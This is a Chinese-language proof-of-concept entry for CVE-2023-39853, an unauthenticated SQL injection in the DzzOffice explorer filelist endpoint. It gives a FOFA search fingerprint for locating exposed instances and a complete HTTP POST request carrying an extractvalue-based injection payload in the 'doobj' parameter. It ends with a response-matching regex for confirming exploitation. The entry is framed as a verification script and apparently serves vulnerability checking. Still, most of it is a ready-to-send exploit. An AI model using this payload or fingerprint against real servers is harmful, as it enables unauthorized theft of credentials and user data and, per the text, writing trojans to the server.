﻿# DzzOffice 办公软件 SQL注入漏洞

> 更新时间：2024-01-15

> 漏洞编号：CVE-2023-39853

> 漏洞说明：DzzOffice办公软件 /index.php?mod=explorer&op=dynamic&do=filelist（网盘动态功能模块）接口处存在SQL注入漏洞，未授权的攻击者可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

> 漏洞特征：FOFA：icon_hash="-1961736892" && body="立即注册"

> 验证脚本：HTTP

```
POST /index.php?mod=explorer&op=dynamic&do=filelist HTTP/1.1
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: u8XY_2132_smile=1D1; u8XY_2132_explorer_index_isshow=show; u8XY_2132_saltkey=UHf5yZS6; u8XY_2132_lastvisit=1704245203; u8XY_2132_ulastactivity=edecqm1iSHNh8KZ5Pu4-47piNuG3efg-PmQo8qkR6iyN76ChohtT; u8XY_2132_auth=3efbjxVYEU2T8P1kjlZpGbjjbwe6HaaULHiIRCkGAp7P67tfPCEVE0cqh6jWbeOmcmq7PWhHl_vZQKw5anfp3A; u8XY_2132_sid=a3V4l7; u8XY_2132_sendmail=1; u8XY_2132_lastact=1704851450%09index.php%09explorer
Connection: close

doobj=' and extractvalue(1,concat(0x7e,user())) and '1'='1&doevent=&uids%5B%5D=1&startdate=&enddate=&disp=&asc=&page=0

```

> 响应代码特征：200

> 响应内容特征：^(?=.*?(?:root|select)).*?$

> 上传文件定位：


> 验证文件来源：DzzOffice 办公软件 SQL注入漏洞.poc
